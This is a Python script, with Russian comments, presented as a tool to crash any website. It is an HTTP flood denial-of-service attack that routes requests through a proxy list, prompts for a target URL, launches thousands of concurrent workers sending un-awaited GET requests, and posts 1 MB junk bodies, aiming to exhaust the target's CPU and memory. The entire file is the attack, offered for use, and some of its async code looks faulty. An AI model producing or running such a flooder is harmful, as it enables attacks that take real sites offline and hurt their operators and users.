# CRASH_SITE.py
# ПАДАЕТ ЛЮБОЙ САЙТ | 100K+ RPS | БЕЗ ОТВЕТА | ПРОКСИ

import asyncio
import aiohttp
import random
import time
import sys
from colorama import Fore, Style, init

init(autoreset=True)

# ================== НАСТРОЙКИ ==================
PROXY_FILE = 'working_proxies.txt'
TARGET = ""
CONCURRENCY = 5000        # ← УБИЙСТВЕННОЕ ЧИСЛО
DURATION = 60
SEND_DATA = True          # ← ОТПРАВЛЯТЬ ТЯЖЁЛЫЕ ДАННЫЕ
# ===============================================

proxies_list = []

# === ЗАГРУЗКА ПРОКСИ ===
async def load_proxies():
    global proxies_list
    try:
        with open(PROXY_FILE, 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        print(f"{Fore.GREEN}[+] {len(proxies_list)} прокси загружено")
    except:
        print(f"{Fore.RED}[-] Без прокси")
        proxies_list = []

# === УБИЙСТВЕННЫЙ РАБОЧИЙ ===
async def killer(session):
    proxy = random.choice(proxies_list) if proxies_list else None
    url = TARGET + "?" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=50))
    
    while True:
        try:
            # ОТПРАВЛЯЕМ БЕЗ ОЖИДАНИЯ ОТВЕТА
            task = session.get(
                url,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=None, connect=5),
                headers={
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'X-a': random.randint(1, 1000000000)
                }
            )
            # НЕ ЖДЁМ ОТВЕТА → ОСВОБОЖДАЕМ ПОТОК
            asyncio.create_task(task)
            
            # ОТПРАВЛЯЕМ ТЯЖЁЛЫЕ ДАННЫЕ (если POST)
            if SEND_DATA and random.random() < 0.3:
                asyncio.create_task(session.post(
                    TARGET,
                    data={'data': 'A' * 1024 * 1024},  # 1 МБ мусора
                    proxy=proxy
                ))
        except:
            pass

# === ОСНОВНОЙ ЦИКЛ ===
async def main():
    global TARGET, CONCURRENCY, DURATION

    print(f"{Fore.RED}CRASH SITE — УБИЙСТВО САЙТА")
    TARGET = input(f"{Fore.CYAN}Цель: {Style.RESET_ALL}").strip()
    if not TARGET.startswith("http"):
        TARGET = "https://" + TARGET

    try:
        CONCURRENCY = int(input(f"{Fore.CYAN}Соединений (1000-10000): {Style.RESET_ALL}") or "5000")
        DURATION = int(input(f"{Fore.CYAN}Секунд: {Style.RESET_ALL}") or "60")
    except:
        pass

    await load_proxies()

    connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False)
    timeout = aiohttp.ClientTimeout(total=None)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        print(f"\n{Fore.RED}ЗАПУСК УБИЙСТВА: {CONCURRENCY} соединений → {TARGET}")
        print(f"{Fore.YELLOW}Цель: CPU 100%, RAM исчерпан, сайт упадёт")
        await asyncio.sleep(2)

        tasks = [killer(session) for _ in range(CONCURRENCY)]
        await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), DURATION)

# === ЗАПУСК ===
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}ОСТАНОВЛЕНО.")